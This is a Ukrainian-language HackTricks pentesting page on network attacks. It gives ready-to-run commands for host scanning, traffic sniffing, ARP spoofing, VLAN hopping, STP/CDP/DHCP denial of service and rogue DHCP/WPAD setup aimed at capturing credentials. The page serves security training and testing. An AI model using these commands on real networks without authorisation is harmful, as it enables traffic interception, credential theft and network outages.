# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## Виявлення хостів ззовні

Це буде **короткий розділ** про те, як знайти **IP-адреси, що відповідають** з **Інтернету**.\
У цій ситуації у вас є деякий **обсяг IP-адрес** (можливо, навіть кілька **діапазонів**) і вам потрібно просто знайти **які IP-адреси відповідають**.

### ICMP

Це **найпростіший** і **найшвидший** спосіб дізнатися, чи активний хост.\
Ви можете спробувати надіслати кілька **ICMP** пакетів і **очікувати відповіді**. Найпростіший спосіб - просто надіслати **echo request** і очікувати відповідь. Ви можете зробити це, використовуючи простий `ping` або використовуючи `fping` для **діапазонів**.\
Ви також можете використовувати **nmap** для надсилання інших типів ICMP пакетів (це уникне фільтрів для звичайних ICMP echo request-response).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

Дуже часто можна виявити, що всі види ICMP пакетів фільтруються. Тоді все, що ви можете зробити, щоб перевірити, чи активний хост, це **спробувати знайти відкриті порти**. Кожен хост має **65535 портів**, тому, якщо у вас "великий" обсяг, ви **не можете** перевірити, чи **кожен порт** кожного хоста відкритий чи ні, це займе занадто багато часу.\
Тоді вам потрібен **швидкий сканер портів** ([masscan](https://github.com/robertdavidgraham/masscan)) і список **найбільш використовуваних портів:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Ви також можете виконати цей крок за допомогою `nmap`, але це повільніше, і дещо `nmap` має проблеми з ідентифікацією активних хостів.

### HTTP Port Discovery

Це просто виявлення TCP портів, корисне, коли ви хочете **зосередитися на виявленні HTTP** **сервісів**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

Ви також можете спробувати перевірити, чи є **відкриті UDP порти**, щоб вирішити, чи слід **звернути більше уваги** на **хост.** Оскільки UDP-сервіси зазвичай **не відповідають** з **жодними даними** на звичайний порожній UDP-запит, важко сказати, чи порт фільтрується, чи відкритий. Найпростіший спосіб вирішити це - надіслати пакет, пов'язаний з працюючим сервісом, і оскільки ви не знаєте, який сервіс працює, вам слід спробувати найбільш ймовірний на основі номера порту:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Запропонована раніше команда nmap протестує **найкращі 1000 UDP портів** на кожному хості в межах **/24** діапазону, але навіть це займе **>20хв**. Якщо потрібні **найшвидші результати**, ви можете використовувати [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24`. Це надішле ці ці **UDP проби** на їх **очікуваний порт** (для діапазону /24 це займе лише 1 хв): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Тут ви можете знайти гарний посібник з усіх відомих атак на Wifi на момент написання:

{{#ref}}
../pentesting-wifi/
{{#endref}}

## Discovering hosts from the inside

Якщо ви всередині мережі, однією з перших речей, які ви захочете зробити, є **виявлення інших хостів**. Залежно від **того, скільки шуму** ви можете/хочете створити, можуть бути виконані різні дії:

### Passive

Ви можете використовувати ці інструменти для пасивного виявлення хостів всередині підключеної мережі:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Active

Зверніть увагу, що техніки, згадані в [_**Виявлення хостів ззовні**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_), також можуть бути **застосовані тут**.\
Але, оскільки ви в **тій же мережі**, що й інші хости, ви можете робити **більше речей**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

Зверніть увагу, що техніки, описані в _Виявленні хостів ззовні_ ([_**ICMP**_](#icmp)), також можуть бути **застосовані тут**.\
Але, оскільки ви в **тій же мережі**, що й інші хости, ви можете зробити **більше речей**:

- Якщо ви **ping** адреси **широкої трансляції підмережі**, ping повинен дійти до **кожного хоста**, і вони можуть **відповісти** **вам**: `ping -b 10.10.5.255`
- Пінгуючи **адресу широкої трансляції мережі**, ви навіть можете знайти хости всередині **інших підмереж**: `ping -b 255.255.255.255`
- Використовуйте прапори `-PE`, `-PP`, `-PM` у `nmap` для виконання виявлення хостів, надсилаючи відповідно **ICMPv4 echo**, **timestamp** та **запити маски підмережі:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan використовується для **включення** комп'ютерів через **мережеве повідомлення**. Магічний пакет, що використовується для включення комп'ютера, є лише пакетом, в якому надається **MAC Dst**, а потім він **повторюється 16 разів** в одному пакеті.\
Потім такі пакети зазвичай надсилаються в **ethernet 0x0842** або в **UDP-пакеті на порт 9**.\
Якщо **[MAC] не надано**, пакет надсилається на **широкотрансляційний ethernet** (і широкотрансляційний MAC буде тим, що повторюється).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Сканування хостів

Якщо ви виявили всі IP-адреси (зовнішні або внутрішні), які ви хочете сканувати детально, можна виконати різні дії.

### TCP

- **Відкритий** порт: _SYN --> SYN/ACK --> RST_
- **Закритий** порт: _SYN --> RST/ACK_
- **Фільтрований** порт: _SYN --> \[НІ ВІДПОВІДІ]_
- **Фільтрований** порт: _SYN --> ICMP повідомлення_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Є 2 варіанти для сканування UDP порту:

- Відправити **UDP пакет** і перевірити відповідь _**ICMP unreachable**_, якщо порт **закритий** (в кількох випадках ICMP буде **фільтруватися**, тому ви не отримаєте жодної інформації, якщо порт закритий або відкритий).
- Відправити **форматовані датаграми** для отримання відповіді від **сервісу** (наприклад, DNS, DHCP, TFTP та інших, як зазначено в _nmap-payloads_). Якщо ви отримали **відповідь**, тоді порт **відкритий**.

**Nmap** буде **поєднувати обидва** варіанти, використовуючи "-sV" (сканування UDP дуже повільне), але зверніть увагу, що сканування UDP повільніше, ніж сканування TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** призначений для використання разом з **TCP (Transmission Control Protocol)** та **UDP (User Datagram Protocol)**. Його основна мета - полегшити транспортування телефонних даних через IP-мережі, відображаючи багато з функцій надійності, які є в **Signaling System 7 (SS7)**. **SCTP** є основним компонентом сімейства протоколів **SIGTRAN**, яке має на меті транспортування сигналів SS7 через IP-мережі.

Підтримка **SCTP** надається різними операційними системами, такими як **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** та **VxWorks**, що свідчить про його широке визнання та корисність у сфері телекомунікацій та мережевих технологій.

Два різні сканування для SCTP пропонуються nmap: _-sY_ та _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS та IPS ухилення

{{#ref}}
ids-evasion.md
{{#endref}}

### **Більше опцій nmap**

{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Виявлення внутрішніх IP-адрес

**Неправильно налаштовані маршрутизатори, брандмауери та мережеві пристрої** іноді відповідають на мережеві запити, використовуючи **непублічні адреси джерела**. **tcpdump** можна використовувати для ідентифікації пакетів, отриманих з приватних адрес під час тестування. Зокрема, на Kali Linux пакети можна захоплювати на **інтерфейсі eth2**, який доступний з публічного Інтернету. Важливо зазначити, що якщо ваша конфігурація знаходиться за NAT або брандмауером, такі пакети, ймовірно, будуть відфільтровані.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing ви можете дізнатися деталі IP-діапазонів, розміри підмереж, MAC-адреси та імена хостів, переглядаючи захоплені кадри та пакети. Якщо мережа неправильно налаштована або комутаційна структура під тиском, зловмисники можуть захопити чутливі матеріали за допомогою пасивного мережевого sniffing.

Якщо комутована Ethernet-мережа налаштована правильно, ви побачите лише широкомовні кадри та матеріали, призначені для вашої MAC-адреси.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Можна також захоплювати пакети з віддаленої машини через сеанс SSH за допомогою Wireshark як графічного інтерфейсу в реальному часі.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Очевидно.

### Захоплення облікових даних

Ви можете використовувати інструменти, такі як [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz), для парсингу облікових даних з pcap або з живого інтерфейсу.

## LAN атаки

### ARP спуфінг

ARP спуфінг полягає в надсиланні безкоштовних ARP-відповідей, щоб вказати, що IP машини має MAC нашого пристрою. Тоді жертва змінить ARP таблицю і буде контактувати з нашою машиною щоразу, коли захоче зв'язатися з підробленим IP.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM переповнення

Переповнити CAM таблицю комутатора, відправляючи багато пакетів з різними MAC-адресами джерела. Коли CAM таблиця заповнена, комутатор починає поводитися як хаб (широкосмугово транслюючи весь трафік).
```bash
macof -i <interface>
```
У сучасних комутаторах ця вразливість була виправлена.

### 802.1Q VLAN / DTP Атаки

#### Динамічне Транкування

**Dynamic Trunking Protocol (DTP)** розроблений як протокол канального рівня для полегшення автоматичної системи транкування, що дозволяє комутаторам автоматично вибирати порти для режиму транку (Trunk) або нетранкового режиму. Використання **DTP** часто вважається показником не оптимального дизайну мережі, підкреслюючи важливість ручного налаштування транків лише там, де це необхідно, і забезпечення належної документації.

За замовчуванням порти комутатора налаштовані на роботу в режимі Dynamic Auto, що означає, що вони готові ініціювати транкування, якщо це запитано сусіднім комутатором. Проблема безпеки виникає, коли пентестер або зловмисник підключається до комутатора і надсилає DTP Desirable кадр, змушуючи порт перейти в режим транку. Ця дія дозволяє зловмиснику перераховувати VLAN через аналіз кадрів STP і обходити сегментацію VLAN, налаштовуючи віртуальні інтерфейси.

Наявність DTP у багатьох комутаторах за замовчуванням може бути використана супротивниками для імітації поведінки комутатора, таким чином отримуючи доступ до трафіку через всі VLAN. Скрипт [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) використовується для моніторингу інтерфейсу, виявляючи, чи знаходиться комутатор у режимі Default, Trunk, Dynamic, Auto або Access—останній є єдиною конфігурацією, яка не підлягає атакам VLAN hopping. Цей інструмент оцінює статус вразливості комутатора.

Якщо вразливість мережі буде виявлена, інструмент _**Yersinia**_ може бути використаний для "увімкнення транкування" через протокол DTP, що дозволяє спостерігати за пакетами з усіх VLAN.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Щоб перерахувати VLAN, також можна згенерувати кадр DTP Desirable за допомогою скрипта [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. Н**е переривайте скрипт за жодних обставин. Він інжектує DTP Desirable кожні три секунди. **Динамічно створені канали trunk на комутаторі живуть лише п'ять хвилин. Після п'яти хвилин trunk відключається.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Я хотів би зазначити, що **Access/Desirable (0x03)** вказує на те, що DTP фрейм є типу Desirable, що вказує порту перейти в режим Trunk. А **802.1Q/802.1Q (0xa5)** вказує на тип інкапсуляції **802.1Q**.

Аналізуючи STP фрейми, **ми дізнаємося про існування VLAN 30 та VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Атака на конкретні VLAN

Якщо ви знаєте VLAN ID та значення IP, ви можете **налаштувати віртуальний інтерфейс для атаки на конкретний VLAN**.\
Якщо DHCP недоступний, використовуйте _ifconfig_ для встановлення статичної IP-адреси.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

Обговорюваний напад **Dynamic Trunking та створення віртуальних інтерфейсів для виявлення хостів всередині** інших VLAN **автоматично виконується** інструментом: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Якщо зловмисник знає значення **MAC, IP та VLAN ID жертви**, він може спробувати **подвійно тегувати кадр** з його призначеним VLAN та VLAN жертви і надіслати пакет. Оскільки **жертва не зможе підключитися назад** до зловмисника, **найкращим варіантом для зловмисника є спілкування через UDP** з протоколами, які можуть виконувати деякі цікаві дії (наприклад, SNMP).

Ще один варіант для зловмисника - запустити **TCP порт-сканування, підробляючи IP, контрольований зловмисником і доступний жертві** (можливо, через інтернет). Тоді зловмисник може перехопити на другому хості, що належить йому, якщо він отримує деякі пакети від жертви.

![](<../../images/image (190).png>)

Щоб виконати цю атаку, ви можете використовувати scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

Якщо у вас є **доступ до комутатора, до якого ви безпосередньо підключені**, ви маєте можливість **обійти сегментацію VLAN** в мережі. Просто **переключіть порт у режим trunk** (також відомий як trunk), створіть віртуальні інтерфейси з ідентифікаторами цільових VLAN, і налаштуйте IP-адресу. Ви можете спробувати запитати адресу динамічно (DHCP) або налаштувати її статично. Це залежить від ситуації.

{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

У певних середовищах, таких як гостьові бездротові мережі, **ізоляція портів (також відома як приватний VLAN)** реалізується для запобігання безпосередньому спілкуванню клієнтів, підключених до бездротової точки доступу. Однак виявлено техніку, яка може обійти ці заходи ізоляції. Ця техніка експлуатує або відсутність мережевих ACL, або їх неправильну конфігурацію, що дозволяє IP-пакетам маршрутизуватися через маршрутизатор для досягнення іншого клієнта в тій же мережі.

Атака виконується шляхом створення **пакета, який містить IP-адресу цільового клієнта, але з MAC-адресою маршрутизатора**. Це змушує маршрутизатор помилково переслати пакет до цільового клієнта. Цей підхід подібний до того, що використовується в атаках Double Tagging, де можливість контролювати хост, доступний жертві, використовується для експлуатації вразливості безпеки.

**Ключові кроки атаки:**

1. **Створення пакета:** Пакет спеціально створюється, щоб включати IP-адресу цільового клієнта, але з MAC-адресою маршрутизатора.
2. **Експлуатація поведінки маршрутизатора:** Створений пакет надсилається до маршрутизатора, який, через конфігурацію, перенаправляє пакет до цільового клієнта, обходячи ізоляцію, забезпечену налаштуваннями приватного VLAN.

### VTP Attacks

VTP (VLAN Trunking Protocol) централізує управління VLAN. Він використовує номери версій для підтримки цілісності бази даних VLAN; будь-яка модифікація збільшує цей номер. Комутатори приймають конфігурації з вищими номерами версій, оновлюючи свої власні бази даних VLAN.

#### VTP Domain Roles

- **VTP Server:** Керує VLAN—створює, видаляє, модифікує. Він транслює оголошення VTP членам домену.
- **VTP Client:** Отримує оголошення VTP для синхронізації своєї бази даних VLAN. Ця роль обмежена від модифікацій локальних конфігурацій VLAN.
- **VTP Transparent:** Не бере участі в оновленнях VTP, але пересилає оголошення VTP. Не підлягає атакам VTP, підтримує постійний номер версії нуль.

#### VTP Advertisement Types

- **Summary Advertisement:** Транслюється сервером VTP кожні 300 секунд, містить основну інформацію про домен.
- **Subset Advertisement:** Надсилається після змін конфігурації VLAN.
- **Advertisement Request:** Видається клієнтом VTP для запиту Summary Advertisement, зазвичай у відповідь на виявлення вищого номера версії конфігурації.

Вразливості VTP можуть бути експлуатовані виключно через trunk порти, оскільки оголошення VTP циркулюють лише через них. Сценарії після атаки DTP можуть перейти до VTP. Інструменти, такі як Yersinia, можуть полегшити атаки VTP, намагаючись знищити базу даних VLAN, ефективно порушуючи мережу.

Примітка: Це обговорення стосується версії VTP 1 (VTPv1).
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
В графічному режимі Yersinia виберіть опцію видалення всіх VTP VLAN для очищення бази даних VLAN.

### Атаки STP

**Якщо ви не можете захопити кадри BPDU на своїх інтерфейсах, малоймовірно, що ви досягнете успіху в атаці STP.**

#### **STP BPDU DoS**

Відправка великої кількості BPDUs TCP (Сповіщення про зміну топології) або Conf (BPDUs, які надсилаються, коли створюється топологія) перевантажує комутатори, і вони перестають працювати належним чином.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Коли надсилається TCP, таблиця CAM комутаторів буде видалена за 15 секунд. Потім, якщо ви постійно надсилаєте такі пакети, таблиця CAM буде перезапускатися безперервно (або кожні 15 секунд), і коли вона перезапускається, комутатор поводиться як хаб.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

Атакуючий імітує поведінку комутатора, щоб стати коренем STP мережі. Тоді більше даних проходитиме через нього. Це цікаво, коли ви підключені до двох різних комутаторів.\
Це робиться шляхом відправки пакетів BPDUs CONF, які говорять, що значення **пріоритету** менше, ніж фактичний пріоритет фактичного кореневого комутатора.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Якщо зловмисник підключений до 2 комутаторів, він може стати коренем нового дерева, і весь трафік між цими комутаторами проходитиме через нього** (буде виконано атаку MITM).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP Атаки

CISCO Discovery Protocol (CDP) є важливим для зв'язку між пристроями CISCO, що дозволяє їм **ідентифікувати один одного та ділитися конфігураційними деталями**.

#### Пасивний збір даних <a href="#id-0e0f" id="id-0e0f"></a>

CDP налаштовано на трансляцію інформації через всі порти, що може призвести до ризику безпеки. Зловмисник, підключившись до порту комутатора, може використовувати мережеві аналізатори, такі як **Wireshark**, **tcpdump** або **Yersinia**. Ця дія може розкрити чутливі дані про мережевий пристрій, включаючи його модель та версію Cisco IOS, яку він використовує. Зловмисник може потім націлитися на конкретні вразливості у виявленій версії Cisco IOS.

#### Виклик затоплення таблиці CDP <a href="#id-0d6a" id="id-0d6a"></a>

Більш агресивний підхід полягає в запуску атаки відмови в обслуговуванні (DoS), перевантажуючи пам'ять комутатора, видаючи себе за легітимні пристрої CISCO. Нижче наведено послідовність команд для ініціювання такої атаки за допомогою Yersinia, інструменту для тестування мережі:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Під час цієї атаки процесор комутатора та таблиця сусідів CDP зазнають великого навантаження, що призводить до того, що це часто називають **“мертвим станом мережі”** через надмірне споживання ресурсів.

#### Атака на підробку CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Ви також можете використовувати [**scapy**](https://github.com/secdev/scapy/). Обов'язково встановіть його з пакетом `scapy/contrib`.

### Атаки VoIP та інструмент VoIP Hopper

VoIP телефони, які все більше інтегруються з IoT пристроями, пропонують функції, такі як відкриття дверей або управління термостатами через спеціальні телефонні номери. Однак ця інтеграція може створювати ризики для безпеки.

Інструмент [**voiphopper**](http://voiphopper.sourceforge.net) призначений для емуляції VoIP телефону в різних середовищах (Cisco, Avaya, Nortel, Alcatel-Lucent). Він виявляє VLAN ID голосової мережі, використовуючи протоколи, такі як CDP, DHCP, LLDP-MED та 802.1Q ARP.

**VoIP Hopper** пропонує три режими для протоколу Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Аналізує мережеві пакети для визначення VLAN ID.
2. **Spoof Mode** (`-c 1`): Генерує користувацькі пакети, що імітують пакети реального VoIP пристрою.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Відправляє пакети, ідентичні пакетам конкретної моделі Cisco IP телефону.

Переважний режим для швидкості - це третій. Він вимагає вказати:

- Мережева інтерфейс атакуючого (`-i` параметр).
- Назва VoIP пристрою, що емулюється (`-E` параметр), відповідно до формату іменування Cisco (наприклад, SEP, за яким слідує MAC адреса).

У корпоративних умовах, щоб імітувати існуючий VoIP пристрій, можна:

- Перевірити MAC етикетку на телефоні.
- Перейти до налаштувань дисплея телефону, щоб переглянути інформацію про модель.
- Підключити VoIP пристрій до ноутбука та спостерігати запити CDP за допомогою Wireshark.

Приклад команди для виконання інструменту в третьому режимі буде:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP Атаки

#### Перерахунок
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Два типи DoS** можуть бути виконані проти DHCP серверів. Перший полягає в тому, щоб **симулювати достатню кількість фейкових хостів, щоб використати всі можливі IP-адреси**.\
Ця атака спрацює лише якщо ви можете бачити відповіді DHCP сервера і завершити протокол (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Наприклад, це **неможливо в Wifi мережах**.

Інший спосіб виконати DHCP DoS - це надіслати **DHCP-RELEASE пакет, використовуючи як вихідний код кожну можливу IP-адресу**. Тоді сервер подумає, що всі закінчили використовувати IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Більш автоматизований спосіб зробити це - використати інструмент [DHCPing](https://github.com/kamorin/DHCPig).

Ви можете використовувати згадані атаки DoS, щоб змусити клієнтів отримувати нові оренди в середовищі та виснажити легітимні сервери, щоб вони стали неактивними. Тож, коли легітимні спробують перепідключитися, **ви можете надати шкідливі значення, згадані в наступній атаці**.

#### Встановлення шкідливих значень

Шкідливий DHCP сервер можна налаштувати за допомогою DHCP скрипта, розташованого за адресою `/usr/share/responder/DHCP.py`. Це корисно для мережевих атак, таких як захоплення HTTP трафіку та облікових даних, шляхом перенаправлення трафіку на шкідливий сервер. Однак налаштування шкідливого шлюзу менш ефективне, оскільки це дозволяє лише захоплювати вихідний трафік від клієнта, пропускаючи відповіді від реального шлюзу. Натомість рекомендується налаштувати шкідливий DNS або WPAD сервер для більш ефективної атаки.

Нижче наведені параметри команд для налаштування шкідливого DHCP сервера:

- **Наша IP адреса (Реклама шлюзу)**: Використовуйте `-i 10.0.0.100`, щоб рекламувати IP вашої машини як шлюз.
- **Локальне ім'я домену DNS**: За бажанням, використовуйте `-d example.org`, щоб встановити локальне ім'я домену DNS.
- **Оригінальна IP адреса маршрутизатора/шлюзу**: Використовуйте `-r 10.0.0.1`, щоб вказати IP адресу легітимного маршрутизатора або шлюзу.
- **IP адреса основного DNS сервера**: Використовуйте `-p 10.0.0.100`, щоб встановити IP адресу шкідливого DNS сервера, яким ви керуєте.
- **IP адреса вторинного DNS сервера**: За бажанням, використовуйте `-s 10.0.0.1`, щоб встановити IP адресу вторинного DNS сервера.
- **Маска підмережі локальної мережі**: Використовуйте `-n 255.255.255.0`, щоб визначити маску підмережі для локальної мережі.
- **Інтерфейс для DHCP трафіку**: Використовуйте `-I eth1`, щоб слухати DHCP трафік на конкретному мережевому інтерфейсі.
- **Адреса конфігурації WPAD**: Використовуйте `-w “http://10.0.0.100/wpad.dat”`, щоб встановити адресу для конфігурації WPAD, що допомагає в перехопленні веб-трафіку.
- **Спуфінг IP адреси за замовчуванням шлюзу**: Додайте `-S`, щоб спуфити IP адресу шлюзу за замовчуванням.
- **Відповідати на всі DHCP запити**: Додайте `-R`, щоб сервер відповідав на всі DHCP запити, але будьте обережні, оскільки це шумно і може бути виявлено.

Правильно використовуючи ці параметри, можна створити шкідливий DHCP сервер для ефективного перехоплення мережевого трафіку.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Атаки EAP**

Ось деякі тактики атак, які можна використовувати проти реалізацій 802.1X:

- Активне брутфорсинг паролів через EAP
- Атака на сервер RADIUS з неправильно сформованим EAP контентом _\*\*_(вразливості)
- Захоплення EAP повідомлень та офлайн злому паролів (EAP-MD5 та PEAP)
- Примусова аутентифікація EAP-MD5 для обходу перевірки сертифіката TLS
- Впровадження шкідливого мережевого трафіку під час аутентифікації за допомогою хаба або подібного

